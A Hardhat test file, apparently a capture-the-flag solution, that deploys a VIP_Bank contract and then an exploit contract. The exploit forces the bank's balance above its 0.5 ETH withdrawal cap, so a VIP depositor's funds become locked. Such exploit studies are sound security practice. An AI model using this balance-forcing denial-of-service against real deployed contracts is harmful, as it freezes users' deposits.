const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

describe("Exploit VIP_Bank Contract", function () {
    before(async () => {
        // deploying the target contract
        const VIP_Bank = await ethers.getContractFactory("VIP_Bank");
        bank = await VIP_Bank.deploy();
        accounts = await ethers.getSigners();
        [manager, vip_victim, exploiter] = accounts;
    })
    it("Manager creates a VIP account", async () => {
        // Manager created VIP account
        await bank.connect(manager).addVIP(vip_victim.address);
        // check if the VIP is set correctly
        expect(await bank.VIP(vip_victim.address)).to.equal(true);
    })
    it("VIP deposits some ether in the bank", async () => {
        // The VIP deposits 0.1 ether to the Bank
        await bank.connect(vip_victim).deposit({ value: ethers.utils.parseEther('0.05') });
        await bank.connect(vip_victim).deposit({ value: ethers.utils.parseEther('0.05') });
        // checking if the balance of user is updated correctly
        expect(await bank.balances(vip_victim.address)).to.equal(ethers.utils.parseEther('0.1'))
    })
    it("VIP is able to withdraw some ether from its balance", async () => {
        let balBeforeWithdraw = await ethers.provider.getBalance(vip_victim.address);
        // VIP withdraws 0.05 ether from its account
        await bank.connect(vip_victim).withdraw(ethers.utils.parseEther('0.05'));
        let balAfterWithdraw = await ethers.provider.getBalance(vip_victim.address);
        // Checking if withdraw is working correctly and balances are being updated
        expect(balAfterWithdraw).to.above(balBeforeWithdraw)
        expect(await bank.balances(vip_victim.address)).to.equal(ethers.utils.parseEther('0.05'))
    })
    it("Exploiter deploys the exploit contract and attacks the VIP_Bank contract", async () => {
        const Exploit = await ethers.getContractFactory("ExploitVIPBank");
        exploit_contract = await Exploit.deploy(bank.address);
        // Exploiter calls the attack contract by sends 0.5 ether and 1 wei and calling attack function
        const amountToSend = ethers.utils.parseEther('0.5').add(BigNumber.from('1')); // 0.5 ether and 1 wei
        await exploit_contract.connect(exploiter).attack({ value: amountToSend })
        // Check if the attack was able to put > 0.5 ether in the target contract
        expect(await bank.contractBalance()).to.above(ethers.utils.parseEther('0.5'));
    })
    it("The attack should be successful: VIP should not be able to withdraw any of its funds", async () => {
        // VIP should have some balance in the bank
        const bal = await bank.balances(vip_victim.address);
        expect(bal).to.above(BigNumber.from('0'));
        // VIP tries to withdraw from its balance - should fail
        await expect(bank.connect(vip_victim).withdraw(bal)).to.revertedWith('Cannot withdraw more than 0.5 ETH per transaction');
    })
});
